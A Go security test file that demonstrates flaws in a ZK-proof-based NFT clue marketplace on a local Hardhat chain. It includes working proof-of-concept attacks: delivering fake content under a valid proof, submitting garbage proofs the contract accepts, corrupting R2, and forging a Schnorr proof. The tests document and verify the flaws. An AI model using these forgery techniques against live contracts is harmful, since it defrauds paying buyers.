// Package tests contains security tests demonstrating vulnerabilities in the ZK proof system.
package tests

import (
	"crypto/elliptic"
	"crypto/rand"
	"math/big"
	"testing"

	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/stretchr/testify/require"

	"github.com/deelawn/skavenge/tests/util"
	"github.com/deelawn/skavenge/zkproof"
)

// These test accounts are from Hardhat's default accounts
// Using separate variable names to avoid conflicts with other test files
const (
	secDeployer = "ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
	secMinter   = "59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"
	secBuyer    = "5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a"
)

// TestVulnerability_DifferentPlaintextSameProof demonstrates that a seller can provide
// a valid proof for one message but encrypt a DIFFERENT message for the buyer.
// This exposes Issue #2: R2 doesn't bind to buyer ciphertext.
func TestVulnerability_DifferentPlaintextSameProof(t *testing.T) {
	// Connect to Hardhat network
	client, err := ethclient.Dial(util.GetHardhatURL())
	require.NoError(t, err)

	// Setup deployer account
	deployerAuth, err := util.NewTransactOpts(client, secDeployer)
	require.NoError(t, err)

	// Deploy contract
	contract, _, err := util.DeployContract(client, deployerAuth)
	require.NoError(t, err)

	// Setup minter account and keys
	minterPrivKey, err := crypto.HexToECDSA(secMinter)
	require.NoError(t, err)
	minterAuth, err := util.NewTransactOpts(client, secMinter)
	require.NoError(t, err)
	minterAddr := minterAuth.From

	// Update authorized minter
	deployerAuth, err = util.NewTransactOpts(client, secDeployer)
	tx, err := contract.UpdateAuthorizedMinter(deployerAuth, minterAddr)
	require.NoError(t, err)
	_, err = util.WaitForTransaction(client, tx)
	require.NoError(t, err)

	// Setup buyer account and keys
	buyerPrivKey, err := crypto.HexToECDSA(secBuyer)
	require.NoError(t, err)
	buyerAddr := crypto.PubkeyToAddress(buyerPrivKey.PublicKey)
	buyerAuth, err := util.NewTransactOpts(client, secBuyer)
	require.NoError(t, err)

	// Create ZK proof system
	ps := zkproof.NewProofSystem()

	// THE ATTACK: Seller claims to have one message but will send a different one
	realClueContent := "The treasure is buried under the old oak tree"
	fakeClueContent := "The treasure is in a volcano (FAKE!)"
	solution := "Oak tree"
	solutionHash := crypto.Keccak256Hash([]byte(solution))

	// Encrypt the REAL clue content for the minter
	encryptedRealClue, err := ps.EncryptMessage([]byte(realClueContent), &minterPrivKey.PublicKey)
	require.NoError(t, err)

	// Mint a clue with the real encrypted content
	minterAuth, err = util.NewTransactOpts(client, secMinter)
	tx, err = contract.MintClue(minterAuth, encryptedRealClue, solutionHash)
	require.NoError(t, err)
	_, err = util.WaitForTransaction(client, tx)
	require.NoError(t, err)

	tokenId, err := getLastMintedTokenID(contract)
	require.NoError(t, err)

	// Set sale price
	minterAuth, err = util.NewTransactOpts(client, secMinter)
	salePrice := big.NewInt(1000000000000000000) // 1 ETH
	tx, err = contract.SetSalePrice(minterAuth, tokenId, salePrice)
	require.NoError(t, err)
	_, err = util.WaitForTransaction(client, tx)
	require.NoError(t, err)

	// Buyer initiates purchase
	buyerAuth.Value = big.NewInt(1000000000000000000)
	tx, err = contract.InitiatePurchase(buyerAuth, tokenId)
	require.NoError(t, err)
	_, err = util.WaitForTransaction(client, tx)
	require.NoError(t, err)

	transferId, err := contract.GenerateTransferId(nil, buyerAddr, tokenId)
	require.NoError(t, err)

	// ATTACK: Generate proof for the REAL content, but encrypt FAKE content for buyer
	// Step 1: Generate proof claiming we're sending the real content
	proofResult, err := ps.GenerateProof([]byte(realClueContent), minterPrivKey, &buyerPrivKey.PublicKey, encryptedRealClue)
	require.NoError(t, err, "Should be able to generate proof for real content")

	// Step 2: Encrypt a DIFFERENT (fake) message for the buyer
	fakeBuyerCipherText, err := ps.EncryptMessage([]byte(fakeClueContent), &buyerPrivKey.PublicKey)
	require.NoError(t, err, "Should be able to encrypt fake content")

	// Step 3: Compute hash of the FAKE ciphertext
	fakeBuyerCipherHash := crypto.Keccak256(fakeBuyerCipherText)

	// Step 4: Provide proof to contract with the FAKE hash
	minterAuth, err = util.NewTransactOpts(client, secMinter)
	var fakeBuyerCipherHashArray [32]byte
	copy(fakeBuyerCipherHashArray[:], fakeBuyerCipherHash)

	// Use the proof generated for real content, but with fake content hash
	marshalRes := proofResult.Proof.Marshal()
	tx, err = contract.ProvideProof(minterAuth, transferId, marshalRes, fakeBuyerCipherHashArray)
	require.NoError(t, err, "Malicious proof should be accepted by contract")
	_, err = util.WaitForTransaction(client, tx)
	require.NoError(t, err)

	// The proof was generated for the REAL content, so if we try to verify it
	// against the seller's real encrypted clue, it would pass
	verifyProof := zkproof.NewProof()
	err = verifyProof.Unmarshal(marshalRes)
	require.NoError(t, err)

	// This verification checks the proof against the seller's ciphertext
	// It will PASS because the proof was made for the real content
	valid := ps.VerifyProof(verifyProof, encryptedRealClue)
	require.True(t, valid, "Proof should verify against seller's ciphertext")

	// Buyer calls VerifyProof (just sets a flag, no real verification)
	buyerAuth, err = util.NewTransactOpts(client, secBuyer)
	tx, err = contract.VerifyProof(buyerAuth, transferId)
	require.NoError(t, err)
	_, err = util.WaitForTransaction(client, tx)
	require.NoError(t, err)

	// Complete transfer with the FAKE encrypted content for buyer
	minterAuth, err = util.NewTransactOpts(client, secMinter)
	tx, err = contract.CompleteTransfer(minterAuth, transferId, fakeBuyerCipherText)
	require.NoError(t, err, "Transfer should complete successfully")
	_, err = util.WaitForTransaction(client, tx)
	require.NoError(t, err)

	// Verify the attack succeeded
	newOwner, err := contract.OwnerOf(nil, tokenId)
	require.NoError(t, err)
	require.Equal(t, buyerAddr, newOwner, "Buyer should now own the NFT")

	// Get the clue contents that buyer received
	receivedClue, err := contract.GetClueContents(nil, tokenId)
	require.NoError(t, err)

	// Buyer can decrypt what they received
	decryptedContent, err := ps.DecryptMessage(receivedClue, buyerPrivKey)
	require.NoError(t, err, "Buyer should be able to decrypt")

	// VULNERABILITY EXPOSED: Buyer received FAKE content, not the real content!
	require.Equal(t, fakeClueContent, string(decryptedContent),
		"VULNERABILITY: Buyer received fake content instead of real content!")
	require.NotEqual(t, realClueContent, string(decryptedContent),
		"Buyer did NOT receive the real clue content they paid for!")

	t.Logf("ATTACK SUCCESSFUL!")
	t.Logf("Seller claimed to send: %q", realClueContent)
	t.Logf("Buyer actually received: %q", string(decryptedContent))
	t.Logf("Proof verified successfully despite content mismatch!")
}

// TestVulnerability_GarbageProofAccepted demonstrates that the smart contract
// accepts any proof bytes without verification.
// This exposes Issue #5: Smart contract doesn't verify proof on-chain.
func TestVulnerability_GarbageProofAccepted(t *testing.T) {
	// Connect to Hardhat network
	client, err := ethclient.Dial(util.GetHardhatURL())
	require.NoError(t, err)

	// Setup deployer account
	deployerAuth, err := util.NewTransactOpts(client, secDeployer)
	require.NoError(t, err)

	// Deploy contract
	contract, _, err := util.DeployContract(client, deployerAuth)
	require.NoError(t, err)

	// Setup minter account and keys
	minterPrivKey, err := crypto.HexToECDSA(secMinter)
	require.NoError(t, err)
	minterAuth, err := util.NewTransactOpts(client, secMinter)
	require.NoError(t, err)
	minterAddr := minterAuth.From

	// Update authorized minter
	deployerAuth, err = util.NewTransactOpts(client, secDeployer)
	tx, err := contract.UpdateAuthorizedMinter(deployerAuth, minterAddr)
	require.NoError(t, err)
	_, err = util.WaitForTransaction(client, tx)
	require.NoError(t, err)

	// Setup buyer account and keys
	buyerPrivKey, err := crypto.HexToECDSA(secBuyer)
	require.NoError(t, err)
	buyerAddr := crypto.PubkeyToAddress(buyerPrivKey.PublicKey)
	buyerAuth, err := util.NewTransactOpts(client, secBuyer)
	require.NoError(t, err)

	// Create ZK proof system
	ps := zkproof.NewProofSystem()

	// Mint a clue
	clueContent := "Find the hidden treasure"
	solution := "Behind waterfall"
	solutionHash := crypto.Keccak256Hash([]byte(solution))

	encryptedClue, err := ps.EncryptMessage([]byte(clueContent), &minterPrivKey.PublicKey)
	require.NoError(t, err)

	minterAuth, err = util.NewTransactOpts(client, secMinter)
	tx, err = contract.MintClue(minterAuth, encryptedClue, solutionHash)
	require.NoError(t, err)
	_, err = util.WaitForTransaction(client, tx)
	require.NoError(t, err)

	tokenId, err := getLastMintedTokenID(contract)
	require.NoError(t, err)

	// Set sale price
	minterAuth, err = util.NewTransactOpts(client, secMinter)
	salePrice := big.NewInt(1000000000000000000)
	tx, err = contract.SetSalePrice(minterAuth, tokenId, salePrice)
	require.NoError(t, err)
	_, err = util.WaitForTransaction(client, tx)
	require.NoError(t, err)

	// Buyer initiates purchase
	buyerAuth.Value = big.NewInt(1000000000000000000)
	tx, err = contract.InitiatePurchase(buyerAuth, tokenId)
	require.NoError(t, err)
	_, err = util.WaitForTransaction(client, tx)
	require.NoError(t, err)

	transferId, err := contract.GenerateTransferId(nil, buyerAddr, tokenId)
	require.NoError(t, err)

	// ATTACK: Provide completely garbage proof bytes
	garbageProof := []byte("This is not a valid proof, just random garbage!")

	// Extend to expected size (356 bytes as per marshal.go)
	// C(32) + S(32) + R1(65) + R2(65) + BuyerPubKey(65) + SellerPubKey(65) + BuyerCipherHash(32)
	expectedSize := 32*3 + 65*4
	garbageProof = make([]byte, expectedSize)
	for i := range garbageProof {
		garbageProof[i] = byte(i % 256) // Fill with pattern
	}

	// Also provide garbage hash
	var garbageHash [32]byte
	copy(garbageHash[:], []byte("garbage hash"))

	// Provide the garbage proof to the contract
	minterAuth, err = util.NewTransactOpts(client, secMinter)
	tx, err = contract.ProvideProof(minterAuth, transferId, garbageProof, garbageHash)

	// VULNERABILITY: Contract accepts garbage proof without verification!
	require.NoError(t, err, "VULNERABILITY: Contract accepts garbage proof!")
	_, err = util.WaitForTransaction(client, tx)
	require.NoError(t, err, "VULNERABILITY: Garbage proof transaction succeeds!")

	t.Logf("VULNERABILITY EXPOSED: Contract accepted completely invalid proof!")
	t.Logf("Proof bytes were just sequential numbers, not cryptographically valid!")
}

// TestVulnerability_ProofDoesntVerifyR2 demonstrates that the VerifyProof function
// only checks R1 and never verifies R2, making the proof incomplete.
// This exposes Issue #1: Incomplete proof verification.
func TestVulnerability_ProofDoesntVerifyR2(t *testing.T) {
	ps := zkproof.NewProofSystem()

	// Generate keys
	sellerKey, err := ps.GenerateKeyPair()
	require.NoError(t, err)

	buyerKey, err := ps.GenerateKeyPair()
	require.NoError(t, err)

	// Create a message and encrypt it
	message := []byte("Secret treasure location")
	sellerCipher, err := ps.EncryptMessage(message, &sellerKey.PublicKey)
	require.NoError(t, err)

	// Generate a valid proof
	proofResult, err := ps.GenerateProof(message, sellerKey, &buyerKey.PublicKey, sellerCipher)
	require.NoError(t, err)

	// Normal proof should verify
	valid := ps.VerifyProof(proofResult.Proof, sellerCipher)
	require.True(t, valid, "Valid proof should verify")

	// ATTACK: Corrupt R2 to be completely wrong
	// R2 should be buyer_pub^k, but we'll replace it with random garbage
	randomX, randomY := ps.Curve.ScalarBaseMult(big.NewInt(12345).Bytes())
	corruptedR2 := elliptic.Marshal(ps.Curve, randomX, randomY)

	corruptedProof := &zkproof.Proof{
		C:               proofResult.Proof.C,
		S:               proofResult.Proof.S,
		R1:              proofResult.Proof.R1,
		R2:              corruptedR2, // CORRUPTED!
		BuyerPubKey:     proofResult.Proof.BuyerPubKey,
		SellerPubKey:    proofResult.Proof.SellerPubKey,
		BuyerCipherHash: proofResult.Proof.BuyerCipherHash,
	}

	// VULNERABILITY: Proof still verifies even though R2 is corrupted!
	stillValid := ps.VerifyProof(corruptedProof, sellerCipher)
	require.True(t, stillValid, "VULNERABILITY: Proof verifies even with corrupted R2!")

	t.Logf("VULNERABILITY EXPOSED: VerifyProof never checks R2!")
	t.Logf("R2 was replaced with random point, but proof still verified!")
	t.Logf("This means the proof doesn't actually bind to the buyer's encryption!")
}

// TestVulnerability_EncryptionNotDeterministic demonstrates that encrypting
// the same message twice produces different ciphertexts, breaking any ability
// to verify plaintext equality by comparing ciphertexts.
// This exposes Issue #4: Non-deterministic encryption.
func TestVulnerability_EncryptionNotDeterministic(t *testing.T) {
	ps := zkproof.NewProofSystem()

	// Generate a key
	key, err := ps.GenerateKeyPair()
	require.NoError(t, err)

	message := []byte("Same message")

	// Encrypt the same message twice
	cipher1, err := ps.EncryptMessage(message, &key.PublicKey)
	require.NoError(t, err)

	cipher2, err := ps.EncryptMessage(message, &key.PublicKey)
	require.NoError(t, err)

	// VULNERABILITY: Same message produces different ciphertexts
	require.NotEqual(t, cipher1, cipher2,
		"VULNERABILITY: Same message produces different ciphertexts!")

	// Both decrypt to the same message
	decrypted1, err := ps.DecryptMessage(cipher1, key)
	require.NoError(t, err)
	require.Equal(t, message, decrypted1)

	decrypted2, err := ps.DecryptMessage(cipher2, key)
	require.NoError(t, err)
	require.Equal(t, message, decrypted2)

	t.Logf("VULNERABILITY EXPOSED: Non-deterministic encryption")
	t.Logf("Same message encrypted twice produces different ciphertexts")
	t.Logf("This makes it impossible to verify plaintext equality by comparing ciphertexts")
	t.Logf("Cipher1 length: %d, Cipher2 length: %d", len(cipher1), len(cipher2))
	t.Logf("Ciphertexts are completely different despite same plaintext!")
}

// TestVulnerability_ProofDoesntProveDecryption demonstrates that the ZK proof
// proves knowledge of the seller's private key, but does NOT prove that the
// seller can actually decrypt the seller's ciphertext or that the plaintext
// matches the buyer's ciphertext.
// This exposes Issue #3: No proof of plaintext equality.
func TestVulnerability_ProofDoesntProveDecryption(t *testing.T) {
	ps := zkproof.NewProofSystem()

	// Generate keys
	sellerKey, err := ps.GenerateKeyPair()
	require.NoError(t, err)

	buyerKey, err := ps.GenerateKeyPair()
	require.NoError(t, err)

	// Create two DIFFERENT messages
	sellerMessage := []byte("Seller knows this")
	buyerMessage := []byte("Buyer gets this (different!)")

	// Encrypt seller's message for seller
	sellerCipher, err := ps.EncryptMessage(sellerMessage, &sellerKey.PublicKey)
	require.NoError(t, err)

	// Encrypt buyer's message for buyer
	buyerCipher, err := ps.EncryptMessage(buyerMessage, &buyerKey.PublicKey)
	require.NoError(t, err)

	// ATTACK: Generate a "proof" using seller's key and buyer's cipher
	// We'll manually construct a Schnorr proof that just proves knowledge of seller's key

	// Generate random k
	kInt, err := rand.Int(rand.Reader, ps.Curve.Params().N)
	require.NoError(t, err)

	// R1 = g^k
	r1x, r1y := ps.Curve.ScalarBaseMult(kInt.Bytes())
	r1Bytes := elliptic.Marshal(ps.Curve, r1x, r1y)

	// R2 = buyer_pub^k (doesn't actually relate to buyer's cipher!)
	r2x, r2y := ps.Curve.ScalarMult(buyerKey.PublicKey.X, buyerKey.PublicKey.Y, kInt.Bytes())
	r2Bytes := elliptic.Marshal(ps.Curve, r2x, r2y)

	// Generate challenge (using different messages!)
	buyerCipherHash := crypto.Keccak256(buyerCipher)
	h := crypto.Keccak256Hash(
		sellerCipher,
		buyerCipherHash,
		elliptic.Marshal(ps.Curve, buyerKey.PublicKey.X, buyerKey.PublicKey.Y),
		elliptic.Marshal(ps.Curve, sellerKey.PublicKey.X, sellerKey.PublicKey.Y),
		r1Bytes,
		r2Bytes,
	)
	c := new(big.Int).SetBytes(h.Bytes())
	c.Mod(c, ps.Curve.Params().N)

	// s = k - c*sellerPrivKey mod n
	s := new(big.Int).Mul(c, sellerKey.D)
	s.Sub(kInt, s)
	s.Mod(s, ps.Curve.Params().N)

	// Create the proof
	maliciousProof := &zkproof.Proof{
		C:               c,
		S:               s,
		R1:              r1Bytes,
		R2:              r2Bytes,
		BuyerPubKey:     elliptic.Marshal(ps.Curve, buyerKey.PublicKey.X, buyerKey.PublicKey.Y),
		SellerPubKey:    elliptic.Marshal(ps.Curve, sellerKey.PublicKey.X, sellerKey.PublicKey.Y),
		BuyerCipherHash: buyerCipherHash,
	}

	// VULNERABILITY: Proof verifies even though seller and buyer ciphers contain DIFFERENT plaintexts!
	valid := ps.VerifyProof(maliciousProof, sellerCipher)
	require.True(t, valid, "VULNERABILITY: Proof verifies despite different plaintexts!")

	// Verify they are indeed different
	decryptedSeller, err := ps.DecryptMessage(sellerCipher, sellerKey)
	require.NoError(t, err)

	decryptedBuyer, err := ps.DecryptMessage(buyerCipher, buyerKey)
	require.NoError(t, err)

	require.NotEqual(t, decryptedSeller, decryptedBuyer, "Messages should be different")

	t.Logf("VULNERABILITY EXPOSED: Proof doesn't verify plaintext equality!")
	t.Logf("Seller's plaintext: %q", string(decryptedSeller))
	t.Logf("Buyer's plaintext: %q", string(decryptedBuyer))
	t.Logf("Proof verified successfully despite completely different messages!")
	t.Logf("The proof only proves seller knows their private key, not plaintext equality!")
}
